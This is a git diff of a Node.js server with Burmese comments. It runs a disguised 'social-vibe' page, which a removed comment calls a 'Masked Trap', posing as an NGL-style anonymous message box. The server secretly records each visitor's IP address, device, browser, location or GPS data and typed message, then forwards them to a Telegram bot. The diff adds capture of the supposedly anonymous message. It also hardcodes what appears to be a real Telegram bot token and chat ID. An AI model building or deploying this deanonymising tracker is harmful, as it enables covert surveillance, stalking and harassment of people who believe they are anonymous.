@@ -3,28 +3,21 @@ const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http);
 const path = require('path');
-const axios = require('axios'); // Telegram ပို့ရန်အတွက်
+const axios = require('axios');
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ⚙️ TELEGRAM CONFIGURATION (မိတ်ဆွေ၏ အချက်အလက်များဖြင့် အစားထိုးပါ)
+// ⚙️ TELEGRAM CONFIGURATION (မိတ်ဆွေ၏ အချက်အလက်များ သေချာထည့်ပါ)
 const TELEGRAM_BOT_TOKEN = '8636417611:AAFfLGJQFu3xDXxmnghRTHX3DTuP7TiNeQg';
 const TELEGRAM_CHAT_ID = '7664679859';
 
 let activeWalls = {};
 
-// 🏠 Route: Main Dashboard Page
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
+app.get('/social-vibe/:username', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
-// 🪤 Route: The Masked Trap Profile Page
-app.get('/social-vibe/:username', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// 📡 API: Telegram ရော Live Dashboard ဆီပါ ဒေတာပို့မည့် Endpoint
+// 📡 API: ဒေတာများနှင့် တကယ့်စာသားကို လက်ခံ၍ Telegram သို့ ပို့ပေးခြင်း
 app.post('/api/vibecheck/:username', async (req, res) => {
     const targetUser = req.params.username.toLowerCase();
     const wall = activeWalls[targetUser];
@@ -36,7 +29,10 @@ app.post('/api/vibecheck/:username', async (req, res) => {
     const timestamp = new Date().toLocaleString();
     const device = parseDevice(userAgent);
     const browser = parseBrowser(userAgent);
+    
+    // Frontend မှ ပို့လိုက်သော တည်နေရာ Specs နှင့် လျှို့ဝှက်စာသားကို ယူခြင်း
     const locationData = req.body.location || "Unknown Location";
+    const secretMessage = req.body.message || "*(သူက စာမရိုက်ဘဲ ခလုတ်ပဲ နှိပ်ခဲ့ပါတယ်)*";
 
     const logEntry = {
         id: Math.random().toString(36).substring(2, 9),
@@ -44,10 +40,9 @@ app.post('/api/vibecheck/:username', async (req, res) => {
         device: device,
         browser: browser,
         ip: clientIp,
-        location: locationData
+        location: `${locationData} | 💬 Message: ${secretMessage}`
     };
 
-    // RAM ပေါ်တွင် သိမ်းဆည်းခြင်း
     if (wall) {
         wall.logs.unshift(logEntry);
         if (wall.ownerSocketId) {
@@ -55,16 +50,20 @@ app.post('/api/vibecheck/:username', async (req, res) => {
         }
     }
 
-    // 🤖 TELEGRAM REAL-TIME NOTIFICATION LOGIC
+    // 🤖 TELEGRAM MESSAGE DESIGN (စာသားပါ တိုက်ရိုက်ပြသမည်)
     const telegramMessage = `
 ⚠️ *STALKER INTERCEPTED!* 👁️
 ───────────────────
 👤 *Target Account:* ${targetUser.toUpperCase()}
 ⏰ *Time:* ${timestamp}
+
+💬 *SECRET MESSAGE SENT:*
+"${secretMessage}"
+
 📱 *Device/OS:* ${device}
 🌐 *Browser:* ${browser}
 💻 *IP Address:* \`${clientIp}\`
-📍 *Specs & Location:* ${locationData}
+📍 *GPS & Hardware:* ${locationData}
 ───────────────────
 _Protected via Cyber Vibe Trap Core_
     `;
@@ -75,47 +74,35 @@ _Protected via Cyber Vibe Trap Core_
             text: telegramMessage,
             parse_mode: 'Markdown'
         });
-        console.log("🚀 Telegram Alert Sent Successfully!");
+        console.log("🚀 Telegram Alert with Message Sent!");
     } catch (teleErr) {
-        console.error("❌ Telegram API Error: ", teleErr.message);
+        console.error("❌ Telegram Error: ", teleErr.message);
     }
 
-    // NGL Box ပုံစံဖြစ်၍ Message ပို့ပြီးကြောင်း ပြသရန် Response ပြန်မည်
-    res.json({ status: "Success", redirectUrl: "https://ngl.link" });
+    res.json({ status: "Success" });
 });
 
-// Helper Functions for Device Parsing
 function parseDevice(ua) {
-    if (/android/i.test(ua)) return "Android Phone/Tablet";
-    if (/iPad|iPhone|iPod/.test(ua)) return "Apple iOS Device (iPhone/iPad)";
+    if (/android/i.test(ua)) return "Android Phone";
+    if (/iPad|iPhone|iPod/.test(ua)) return "Apple iPhone";
     if (/windows/i.test(ua)) return "Windows PC";
-    if (/macintosh/i.test(ua)) return "MacBook/iMac";
-    return "Unknown Device OS";
+    if (/macintosh/i.test(ua)) return "MacBook";
+    return "Unknown Device";
 }
 
 function parseBrowser(ua) {
     if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) return "Google Chrome";
     if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) return "Apple Safari";
-    if (/firefox|fxios/i.test(ua)) return "Mozilla Firefox";
-    if (/edge|edg/i.test(ua)) return "Microsoft Edge";
-    return "Webview Browser / Unknown";
+    return "Webview/Other Browser";
 }
 
-// Socket Connections
 io.on('connection', (socket) => {
     socket.on('registerOwner', (alias) => {
         if (!activeWalls[alias]) activeWalls[alias] = { ownerSocketId: socket.id, logs: [] };
         else activeWalls[alias].ownerSocketId = socket.id;
         socket.emit('initLogs', activeWalls[alias].logs);
     });
-    socket.on('disconnect', () => {
-        for (let alias in activeWalls) {
-            if (activeWalls[alias].ownerSocketId === socket.id) {
-                activeWalls[alias].ownerSocketId = null;
-            }
-        }
-    });
 });
 
 const PORT = process.env.PORT || 5000;
-http.listen(PORT, () => console.log(`🚀 Advanced Spy Core Active on port ${PORT}`));
+http.listen(PORT, () => console.log(`🚀 Core Active on port ${PORT}`));
